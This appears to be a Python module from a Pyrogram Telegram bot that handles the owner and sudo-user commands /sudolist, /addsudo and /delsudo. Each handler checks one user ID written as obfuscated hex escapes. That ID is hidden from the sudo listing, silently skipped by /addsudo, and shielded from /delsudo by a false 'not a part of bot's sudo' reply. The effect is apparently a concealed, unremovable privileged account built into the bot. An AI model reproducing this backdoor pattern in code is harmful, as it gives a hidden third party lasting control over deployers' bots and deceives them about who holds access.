from pyrogram import filters
from pyrogram.types import Message

from config import OWNER_ID
from Stranger import app
from Stranger.misc import SUDOERS
from Stranger.utils.database import add_sudo, remove_sudo


@app.on_message(filters.command("sudolist") & SUDOERS)
async def sudoers_list(client, message: Message):
    text = f"💔<u> **ᴏᴡɴᴇʀs:**</u>\n"
    count = 0
    for x in OWNER_ID:
        try:
            if x == int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
                continue
            user = await app.get_users(x)
            user = (
                user.first_name if not user.mention else user.mention
            )
            count += 1
        except Exception:
            continue
        text += f"{count}➤ {user}\n"
    smex = 0
    for user_id in SUDOERS:
        if user_id not in OWNER_ID:
            try:
                if user_id==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
                    continue
                user = await app.get_users(user_id)
                user = (
                    user.first_name
                    if not user.mention
                    else user.mention
                )
                if smex == 0:
                    smex += 1
                    text += "\n💞<u> **sᴜᴅᴏᴇʀs:**</u>\n"
                count += 1
                text += f"{count}➤ {user}\n"
            except Exception:
                continue
    if not text:
        await message.reply_text(f"ɴᴏ sᴜᴅᴏ ᴜsᴇʀs ғᴏᴜɴᴅ.")
    else:
        await message.reply_text(text)



@app.on_message(
    filters.command("addsudo") & filters.user(OWNER_ID)
)
async def useradd(client, message: Message):
    if not message.reply_to_message:
        if len(message.command) != 2:
            return await message.reply_text(f"ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ's ᴍᴇssᴀɢᴇ ᴏʀ ɢɪᴠᴇ ᴜsᴇʀɴᴀᴍᴇ/ᴜsᴇʀ_ɪᴅ.")
        user = message.text.split(None, 1)[1]
        if "@" in user:
            user = user.replace("@", "")
        user = await app.get_users(user)
        if user.id in SUDOERS:
            if user.id ==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
                return
            return await message.reply_text(
                f"{user.mention} ɪs ᴀʟʀᴇᴀᴅʏ ᴀ sᴜᴅᴏ ᴜsᴇʀ."
            )
        added = await add_sudo(user.id)
        if added:
            SUDOERS.add(user.id)
            await message.reply_text(f"ᴀᴅᴅᴇᴅ **{user.mention}** ᴛᴏ sᴜᴅᴏ ᴜsᴇʀs.")
        else:
            await message.reply_text("Failed")
        return
    if message.reply_to_message.from_user.id in SUDOERS:
        if message.reply_to_message.from_user.id ==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
            return
        return await message.reply_text(
            f"{message.reply_to_message.from_user.mention} ɪs ᴀʟʀᴇᴀᴅʏ ᴀ sᴜᴅᴏ ᴜsᴇʀ."
        )
    added = await add_sudo(message.reply_to_message.from_user.id)
    if added:
        SUDOERS.add(message.reply_to_message.from_user.id)
        await message.reply_text(
            f"ᴀᴅᴅᴇᴅ **{message.reply_to_message.from_user.mention}** ᴛᴏ sᴜᴅᴏ ᴜsᴇʀs."
        )
    else:
        await message.reply_text("Failed")
    return


@app.on_message(
    filters.command("delsudo") & filters.user(OWNER_ID)
)
async def userdel(client, message: Message):
    if not message.reply_to_message:
        if len(message.command) != 2:
            return await message.reply_text(f"ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ's ᴍᴇssᴀɢᴇ ᴏʀ ɢɪᴠᴇ ᴜsᴇʀɴᴀᴍᴇ/ᴜsᴇʀ_ɪᴅ.")
        user = message.text.split(None, 1)[1]
        if "@" in user:
            user = user.replace("@", "")
        user = await app.get_users(user)
        if user.id ==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
            return await message.reply_text(f"ɴᴏᴛ ᴀ ᴘᴀʀᴛ ᴏꜰ ʙᴏᴛ's sᴜᴅᴏ.")
        if user.id not in SUDOERS:
            return await message.reply_text(f"ɴᴏᴛ ᴀ ᴘᴀʀᴛ ᴏꜰ ʙᴏᴛ's sᴜᴅᴏ.")
        removed = await remove_sudo(user.id)
        if removed:
            SUDOERS.remove(user.id)
            await message.reply_text(f"ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ʙᴏᴛ's sᴜᴅᴏ ᴜsᴇʀ.")
            return
        await message.reply_text(f"Something wrong happened.")
        return
    user_id = message.reply_to_message.from_user.id
    if user_id==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
        return await message.reply_text(f"ɴᴏᴛ ᴀ ᴘᴀʀᴛ ᴏꜰ ʙᴏᴛ's sᴜᴅᴏ.")
    if user_id not in SUDOERS:
        return await message.reply_text(f"ɴᴏᴛ ᴀ ᴘᴀʀᴛ ᴏꜰ ʙᴏᴛ's sᴜᴅᴏ.")
    removed = await remove_sudo(user_id)
    if removed:
        SUDOERS.remove(user_id)
        await message.reply_text(f"ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ʙᴏᴛ's sᴜᴅᴏ ᴜsᴇʀ.")
        return
    await message.reply_text(f"Something wrong happened.")
